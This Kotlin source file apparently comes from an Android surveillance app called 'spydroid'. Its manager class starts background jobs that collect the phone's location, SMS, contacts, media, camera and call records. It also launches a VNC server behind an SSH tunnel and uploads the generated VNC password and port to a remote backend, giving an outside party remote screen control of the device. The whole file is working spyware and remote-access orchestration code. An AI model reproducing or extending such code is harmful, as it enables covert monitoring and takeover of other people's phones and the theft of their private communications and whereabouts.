/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.manager.features

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.preference.PreferenceManager
import android.widget.Toast
import androidx.work.BackoffPolicy
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import androidx.work.WorkRequest
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import net.christianbeier.droidvnc_ng.Constants
import net.christianbeier.droidvnc_ng.Defaults
import net.christianbeier.droidvnc_ng.VncService
import net.spydroid.common.local.LocalDataProvider
import net.spydroid.common.local.data.GLOBAL_STATES_PERMISSIONS
import net.spydroid.common.remote.RemoteDataProvider
import net.spydroid.common.remote.network.models.InfoDevices
import net.spydroid.feature.calls.CallsWork
import net.spydroid.feature.camera.CameraWork
import net.spydroid.feature.contacts.ContactsWork
import net.spydroid.feature.location.LocationWork
import net.spydroid.feature.multimedia.MultimediaWork
import net.spydroid.feature.sharedata.ShareDataWork
import net.spydroid.feature.sms.SmsWork
import java.util.concurrent.TimeUnit
import kotlin.random.Random


private fun passwordServerVnc(size: Int = 12): String {
    val caracteres =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#\$%^&*()-_=+<>?"
    return (1..size)
        .map { Random.nextInt(0, caracteres.length) }
        .map(caracteres::get)
        .joinToString("")
}

@SuppressLint("MissingPermission")
private fun isInternetAvailable(context: Context): Boolean {
    val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    val network = connectivityManager.activeNetwork ?: return false
    val networkCapabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
    return when {
        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
        networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> true
        else -> false
    }
}

@Suppress("DEPRECATION")
class ManagerFeatures(
    private val context: Context
) {

    private val localDataProvider = LocalDataProvider.current(context)
    private val coroutineScope = CoroutineScope(Dispatchers.Main)

    inner class vnc {

        private val remoteDataProvider = RemoteDataProvider.current(context)

        fun start() {
            val intent = Intent(context, VncService::class.java)
            val prefs = PreferenceManager.getDefaultSharedPreferences(context)
            val mDefaults = Defaults(context)

            val password = passwordServerVnc(20)

            val editor = prefs.edit()
            editor.putString(Constants.PREFS_KEY_SETTINGS_PASSWORD, password)
            editor.apply()

            coroutineScope.launch {
                remoteDataProvider.infoUploaded.collect { infoUploaded ->
                    if (!infoUploaded) {
                        remoteDataProvider.startSshTunnel{ port ->
                            remoteDataProvider.setPasswordVnc(password)
                            coroutineScope.launch {
                                localDataProvider.aliasDevice.collect { alias ->
                                    remoteDataProvider.setInfo(
                                        InfoDevices(
                                            alias = alias,
                                            vnc_password = password,
                                            vnc_port = 5300 //port
                                        )
                                    )
                                }
                            }
                        }
                    } else {
                        remoteDataProvider.startSshTunnel{ port ->
                            remoteDataProvider.setPasswordVnc(password)
                            coroutineScope.launch {
                                localDataProvider.aliasDevice.collect { alias ->
                                    remoteDataProvider.updateInfo(
                                        InfoDevices(
                                            alias = alias,
                                            vnc_password = password,
                                            vnc_port = port
                                        )
                                    )
                                }
                            }
                        }
                    }
                }
            }

            intent.putExtra(
                VncService.EXTRA_PORT,
                prefs.getInt(Constants.PREFS_KEY_SETTINGS_PORT, mDefaults.port)
            )
            intent.putExtra(
                VncService.EXTRA_PASSWORD,
                prefs.getString(Constants.PREFS_KEY_SETTINGS_PASSWORD, mDefaults.password)
            )
            intent.putExtra(
                VncService.EXTRA_FILE_TRANSFER,
                prefs.getBoolean(Constants.PREFS_KEY_SETTINGS_FILE_TRANSFER, mDefaults.fileTransfer)
            )
            intent.putExtra(
                VncService.EXTRA_VIEW_ONLY,
                prefs.getBoolean(Constants.PREFS_KEY_SETTINGS_VIEW_ONLY, mDefaults.viewOnly)
            )
            intent.putExtra(
                VncService.EXTRA_SHOW_POINTERS,
                prefs.getBoolean(Constants.PREFS_KEY_SETTINGS_SHOW_POINTERS, mDefaults.showPointers)
            )
            intent.putExtra(
                VncService.EXTRA_SCALING,
                prefs.getFloat(Constants.PREFS_KEY_SETTINGS_SCALING, mDefaults.scaling)
            )
            intent.putExtra(
                VncService.EXTRA_ACCESS_KEY,
                prefs.getString(Constants.PREFS_KEY_SETTINGS_ACCESS_KEY, mDefaults.accessKey)
            )
            intent.setAction(VncService.ACTION_START)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop() {
            val intent = Intent(context, VncService::class.java)
            intent.setAction(VncService.ACTION_STOP)
            context.stopService(intent)
        }
    }

    inner class location() {
        fun start() {
            coroutineScope.launch {
                localDataProvider.locationState.collect {
                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
                        val locationWork: WorkRequest =
                            OneTimeWorkRequest.Builder(LocationWork::class.java).build()
                        WorkManager.getInstance(context).enqueue(locationWork)
                        showText("Localización")
                    }
                }
            }
        }

        fun stop() {
            //todo
        }
    }

    inner class sms() {
        fun start() {
            coroutineScope.launch {
                localDataProvider.smsState.collect {
                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
                        val smsWork: WorkRequest =
                            OneTimeWorkRequest.Builder(SmsWork::class.java).build()
                        WorkManager.getInstance(context).enqueue(smsWork)
                        showText("Mensajes")
                    }
                }
            }
        }

        fun stop() {
            //todo
        }
    }

    inner class contacts() {
        fun start() {
            coroutineScope.launch {
                localDataProvider.contactsState.collect {
                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
                        val contactsWork: WorkRequest =
                            OneTimeWorkRequest.Builder(ContactsWork::class.java).build()
                        WorkManager.getInstance(context).enqueue(contactsWork)
                        showText("Contactos")
                    }
                }
            }

        }

        fun stop() {
            //todo
        }
    }

    inner class multimedia() {
        fun start() {

            coroutineScope.launch {
                localDataProvider.multimediaState.collect {
                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
                        val multimediaWork: WorkRequest =
                            OneTimeWorkRequest.Builder(MultimediaWork::class.java)
                                .setBackoffCriteria(
                                    BackoffPolicy.LINEAR,  // politics
                                    10,  // Time 10 mins
                                    TimeUnit.MINUTES
                                )
                                .build()

                        WorkManager.getInstance(context).enqueue(multimediaWork)
                        showText("Multimedia")
                    }
                }
            }

        }

        fun stop() {
            //todo
        }
    }

    inner class camera() {
        fun start() {
            coroutineScope.launch {
                localDataProvider.cameraState.collect {
                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
                        val cameraWOrk: WorkRequest =
                            OneTimeWorkRequest.Builder(CameraWork::class.java).build()
                        WorkManager.getInstance(context).enqueue(cameraWOrk)
                    }
                    showText("Cámara")
                }
            }

        }

        fun stop() {
            //todo
        }
    }

    inner class calls() {
        fun start() {

            coroutineScope.launch {
                localDataProvider.callsState.collect {
                    if (it == GLOBAL_STATES_PERMISSIONS.GRANTED) {
                        val callsWork: WorkRequest =
                            OneTimeWorkRequest.Builder(CallsWork::class.java).build()
                        WorkManager.getInstance(context).enqueue(callsWork)
                    }
                    showText("LLamadas")
                }
            }

        }

        fun stop() {
            //todo
        }
    }

    inner class shareData() {
        fun start() {
            if (isInternetAvailable(context)){
                coroutineScope.launch {
                    localDataProvider.shareDataState.collect {
                        val shareDataWork: WorkRequest =
                            OneTimeWorkRequest.Builder(ShareDataWork::class.java)
                                .build()
                        WorkManager.getInstance(context).enqueue(shareDataWork)
                        showText("ShareData")
                    }
                }
            } else {
                showText("NO INTERNET")
            }
        }

        fun stop() {
            //todo
        }
    }

    private fun showText(text: String) =
        Toast.makeText(context, "Started $text", Toast.LENGTH_SHORT).show()
}